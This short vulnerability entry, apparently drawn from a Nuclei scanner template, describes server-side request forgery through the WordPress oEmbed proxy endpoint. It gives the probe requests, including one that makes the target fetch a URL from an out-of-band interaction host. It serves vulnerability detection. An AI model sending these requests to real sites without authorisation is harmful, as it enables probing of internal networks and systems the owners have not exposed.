# Vulnerability: Wordpress Oembed Proxy - Server-side request forgery
**Classification:** CWE-918
**Source:** Nuclei Template (`wordpress-ssrf-oembed.yaml`)

## Description
The oEmbed feature in WordPress allows embedding content from external sources, and if it's not properly secured, it could be exploited for SSRF.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /wp-json/oembed/1.0/proxy HTTP/1.1
Host: {{Hostname}}

GET /wp-json/oembed/1.0/proxy?url=http://{{interactsh-url}} HTTP/1.1
Host: {{Hostname}}
```

